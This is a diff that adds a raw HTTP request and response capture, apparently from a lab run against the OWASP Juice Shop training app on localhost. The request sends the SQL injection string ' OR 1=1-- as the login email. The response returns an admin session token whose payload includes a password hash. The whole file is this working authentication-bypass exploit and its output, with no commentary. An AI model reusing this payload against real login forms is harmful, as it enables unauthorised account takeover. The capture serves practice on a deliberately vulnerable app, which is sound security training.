@@ -1,0 +1,33 @@
+POST http://localhost:3000/rest/user/login HTTP/1.1
+Host: localhost:3000
+Proxy-Connection: keep-alive
+Content-Length: 40
+sec-ch-ua-platform: "Windows"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36
+Accept: application/json, text/plain, */*
+sec-ch-ua: "Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+Origin: http://localhost:3000
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Language: es-ES,es;q=0.9
+Cookie: language=en
+
+{"email":"' OR 1=1--","password":"1234"}HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: application/json; charset=utf-8
+Content-Length: 784
+ETag: W/"310-SgUH/vvPQbEiyanCwvD0Y22PI+c"
+Vary: Accept-Encoding
+Date: Wed, 21 Oct 2026 09:18:10 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMSAwOTowNjo1My44MzcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMSAwOTowNjo1My44MzcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTI1NzQyOTB9.QbULp6x_GplRkGwwiC85ROoPRuGwu1t6DFPO2hxLblZQ8S-NWKzqezBS8yhBrmb9mWQ0skKiwRSMpSICN2EPIwueRQyJepfbhQhjdFDEjPwp0zk1eHgOPzU0reiUYQqoDr9TXInt9dJKPca63rXx7vUBiwa93FFQIqbOnibJKnI","bid":1,"umail":"admin@juice-sh.op"}}
